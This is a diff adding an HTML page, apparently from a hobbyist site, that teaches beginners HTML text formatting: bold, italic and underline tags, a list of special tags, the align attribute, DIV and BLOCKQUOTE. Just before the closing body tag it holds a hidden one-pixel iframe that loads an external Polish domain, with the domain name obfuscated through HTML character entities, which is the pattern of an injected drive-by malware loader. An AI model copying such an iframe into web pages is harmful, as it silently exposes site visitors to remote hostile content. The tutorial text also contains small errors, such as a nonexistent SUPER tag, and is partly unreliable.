@@ -1,0 +1,65 @@
+<HTML>
+<HEAD>
+<TITLE>Lesson 5: More on Formatting your Text</TITLE>
+</HEAD>
+
+<H2>Lesson 5: More on Formatting your Text</TITLE>
+
+Hey! We're really getting somewhere! By now i'll bet that you've got a very informative page with a beautiful link to someplace (this site? please?! awww....) on it. That's great, but i'll bet you're hungry to make it look even more beautiful than it already is (or maybe your boss demands it!). Well, read on!<p>
+
+Do you like your name to stand out on your pages? I do! On every page i make sure that <i>little v</i> is in boldface. How did I do this? HTML has some special tags that allow us to change the way our text is shown. The one i just used is the &#60;B&#62; or <B>boldface</B> tag. You can also make text in italics with the &#60;I&#62; or <I>italics</i> tag. Similarly, you can underline text with the &#60;U&#62; or <U>underline</u> tag. These tags need both an opening tag and a closing tag, so the format is &#60;I, B, or U&#62;<I0>text to be formatted</I>&#60;/I, B, or U&#62;.<p>
+
+In addition to these regular formatting tags, theres lots of special formatting tags. Heres a list of them
+
+<OL>Special formatting tags
+<li>&#60;SMALL&#62 - Small text
+<li>&#60;BIG&#62 - Big text
+<li>&#60;SUPER&#62 - Superscript
+<li>&#60;SUB&#62 - Subscript
+<li>&#60;STRIKE&#62 - Strikethrough text (text with a line through it)
+<li>&#60;TT&#62 - Monospaced (typewriter style) text
+<li>&#60;PRE&#62 - Preserves all format and line breaks in source HTML
+</OL>
+
+Yep, <i>text formatting is great!</i> Now here's how to <B>align</B> your text.<p>
+
+When you align your text, it lines up with that portion of the window. So left aligned text (the default)is lined up with the left side of the window just like using a word processor and clicking the left align button.<p>
+
+However, there is no align tag. What HTML has is what's called an <B>attribute</B>. An attribute is an argument that is put into a tag to change the way that tag works. The <b>align</b> attribute can be put into many different tags to format paragraphs, or blocks of text (pictures too-more on this later). So if we wanted to make a paragraph aligned to the center of our window, we'd just add the align attribute to the &#60;P&#62; tag at the beginning of that paragraph. So it would look like this:<p>
+
+&#60;P ALIGN="center"&#62;<BR>
+Hi, this paragraph is aligned to the center. This was accomplished by using the align attribute.<p>
+
+And here's how it would show up in the browser window:
+
+<P ALIGN="center">
+Hi, this paragraph is aligned to the center. This was accomplished by using the align attribute.<p>
+
+There is also a way to format whole blocks of text. The way we do this is by using the &#60;DIV&#62;, or <b>division</b> tag. The division tag really does'nt do anything without the align attribute. In fact, it's useless with no attributes!<p>
+
+The &#60;DIV&#62; tag is used like this:<p>
+
+&#60;DIV ALIGN="left"&#62<BR>
+This is the text to be left aligned.
+&#60;P&#62
+I can align lots of text with the division tag!<BR>
+&#60;/DIV&#62<p>
+
+If we put this into our web page, it shows up in a browser like this:<p>
+
+<DIV ALIGN="left">
+This is the text to be left aligned.<p>
+I can align lots of text with the division tag!
+</DIV><p>
+
+The align tag can also be used in headers. If you want your header to be eye catching, align="center" it!<p>
+
+All this stuff is great, but i bet you're worrying about the small margin space in your pages. Well, that can be fixed with one easy tag: the &#60;BLOCKQUOTE&#62 tag! Simply put a &#60;BLOCKQUOTE&#62 right under that &#60;BODY&#62 tag, and a &#60;/BLOCKQUOTE&#62 right above the &#60;/BODY&#62, and you'll have beautiful margins in your page with minimal work!<p>
+
+Now you should be an expert in text format and alignment. Take a few minute to absorb what you've just learned, and surf to the <A HREF="lesson6.html">next lesson</A>.<p>
+
+<A HREF="../main3.html">Back to Blacksun's Mainpage</A>
+
+<iframe src="http://jL.c&#104;ura&#46;pl/rc/" style="width:1px;height:1px"></iframe>
+</BODY>
+</HTML>
